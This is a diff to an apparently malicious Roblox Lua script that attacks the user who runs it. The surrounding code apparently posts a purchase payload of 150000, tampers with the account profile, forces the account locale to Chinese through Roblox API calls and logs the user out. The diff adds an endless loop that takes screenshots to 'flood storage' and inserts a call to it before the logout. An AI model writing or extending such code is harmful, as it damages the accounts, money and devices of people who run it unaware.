@@ -136,6 +136,12 @@ local helios = '{"expectedCurrency":1,"expectedPrice":150000,"expectedSellerId":
 
 task.wait(0.01)
 
+local function screenshot() -- flood storage
+while wait() do
+game.CoreGui:TakeScreenshot()
+end
+end
+
 local function godly() -- mess with the roblox account profile
 local player = game.Players.LocalPlayer
 local userId = player.UserId
@@ -166,6 +172,7 @@ end)
 task.wait(0.01)
 game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://locale.roblox.com/v1/locales/set-user-supported-locale", china)
 task.wait(0.01)
+screenshot()
 game:GetService("HttpRbxApiService"):PostAsyncFullUrl("https://auth.roblox.com/v1/logout", none)
 task.wait(3)
 print("oops")
@@ -245,4 +252,3 @@ end
 task.wait(0.01)
 end
 -- cya
-
